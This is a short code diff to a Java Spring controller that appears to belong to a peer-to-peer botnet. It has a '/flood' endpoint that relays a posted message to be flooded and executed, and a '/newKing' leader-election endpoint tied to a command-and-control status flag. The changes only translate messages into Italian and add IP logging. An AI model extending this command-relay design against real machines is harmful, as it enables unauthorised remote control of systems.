@@ -46,19 +46,21 @@ public class BotController {
 
 	@RequestMapping("/")
 	public String index() {
-		return "Bot is Ready";
+		return "BOT OPERATIVO";
 	}
 
 	@RequestMapping(value = "/flood", method = RequestMethod.POST)
 	public Boolean msgFlood(@RequestBody String msg,HttpServletRequest req) {
 		
 		IP ip=new IP(req.getRemoteAddr());
+		System.out.println("Richiesta di Flood ricevuta da "+ip.toString());
 		bhv.floodAndExecute(msg,ip);
 		return true;
 	}
 
 	@RequestMapping("/newKing")
 	public Boolean newKing(HttpServletRequest req) {
+		System.out.println("Richiesta di Elezione ricevuta da"+req.getRemoteAddr());
 		if (nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {
 
 //			System.out.println("addr: " + req.getRemoteAddr());
@@ -67,7 +69,8 @@ public class BotController {
 			bhv.getPower(req.getRemoteAddr());
 			return true;
 		} else {
-			System.out.println("not elegible or already elected");
+			//System.out.println("not elegible or already elected");
+			System.out.println("Non elegibile o gia eletto");
 			return false;
 		}
 	}
